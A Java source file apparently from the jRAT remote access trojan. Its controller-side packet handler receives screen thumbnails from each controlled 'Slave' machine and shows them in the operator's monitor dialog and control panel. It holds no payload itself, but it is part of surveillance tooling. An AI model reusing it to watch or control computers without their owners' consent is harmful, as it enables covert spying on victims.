package io.jrat.controller.packets.incoming;

import io.jrat.common.utils.ImageUtils;
import io.jrat.controller.Slave;
import io.jrat.controller.ui.dialogs.DialogPickMonitor;
import io.jrat.controller.ui.frames.FrameControlPanel;
import io.jrat.controller.ui.panels.PanelControlMonitors;

import java.awt.image.BufferedImage;
import java.io.DataInputStream;
import java.util.List;

import com.redpois0n.graphs.monitors.PanelMonitors.PanelMonitor;

public class Packet71AllThumbnails extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		int monitors = dis.readInt();
		
		for (int i = 0; i < monitors; i++) {
			int len = dis.readInt();
			
			byte[] buffer = new byte[len];

			dis.readFully(buffer);
			
			BufferedImage image = ImageUtils.decodeImage(buffer);
			
			DialogPickMonitor dialog = DialogPickMonitor.instances.get(slave);			
			if (dialog != null) {
				List<PanelMonitor> panels = dialog.getPanelMonitors().getPanels();
				panels.get(i).setThumbnail(image);
			}
			
			FrameControlPanel frame = FrameControlPanel.instances.get(slave);
			if (frame != null) {
				PanelControlMonitors panel = (PanelControlMonitors) frame.panels.get("monitors");
				panel.getPanelMonitors().getPanels().get(i).setThumbnail(image);
			}
		}
	}

}
